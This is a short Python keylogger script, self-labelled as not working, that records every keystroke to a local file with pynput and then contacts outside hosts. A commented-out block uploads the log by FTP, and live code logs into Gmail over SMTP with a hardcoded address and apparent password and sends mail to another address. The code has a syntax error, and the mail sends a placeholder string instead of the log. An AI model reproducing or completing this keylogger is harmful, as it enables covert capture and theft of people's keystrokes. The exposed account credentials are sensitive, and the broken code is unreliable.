#NOT WORKING
from pynput.keyboard import Key,Listener
#import ftplib
import logging
import smtplib

#log directory
logdir=""

#configuration of log file
logging.basicConfig(filename=(logdir+"keylog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

#function for pressing_key
def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(Key))

#function for release key
def releasing_key(key):
    if key==Key.Esc
        return False

print("\n Starting Listening\n")

#Key Listener
with Listener(on_press=pressing_key,on_release=releasing_key) as listener:
    listener.join()

print("\nConnecting to FTO and sending the data.....\n")

#connecting to FTP server and sending the data
#session=ftplib.FTP('',"msfadmin","msfdmin")
#file=open("keylog-res.txt","rb")
#session.storbinary("STOR keylog-res.txt",file)
#file.close()
#session.quit()

content="hii"
mail=smtplib.SMTP("smtp.gmail.com",587)

mail.ehlo()
mail.starttls()
mail.login("tkushal216@gmail.com","yashpraj3498")
mail.sendmail("tkushal216@gmail.com","gbhatgoutham@gmail.com",content)
mail.close()
